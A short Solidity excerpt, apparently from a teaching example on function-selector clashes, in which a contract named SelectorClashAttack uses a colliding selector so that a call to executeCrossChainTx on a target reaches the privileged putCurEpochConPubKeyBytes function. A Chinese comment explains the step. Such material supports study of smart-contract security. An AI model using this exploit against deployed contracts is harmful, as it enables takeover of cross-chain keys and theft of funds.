...
contract SelectorClashAttack {
    ...
    function attack(address target) public {
        bytes4 selector = SelectorClash.putCurEpochConPubKeyBytes.selector;
        bytes4 selector1 = bytes4(keccak256(abi.encodePacked("f1121318093(bytes,bytes,uint64)")));
        require(selector == selector1, "Selector not match");

        // 通过调用executeCrossChainTx方法来攻击putCurEpochConPubKeyBytes(bytes memory)方法
        SelectorClash(target).executeCrossChainTx(bytes("f1121318093"), abi.encode(0x0), abi.encode(0x0), 0);
    }
}
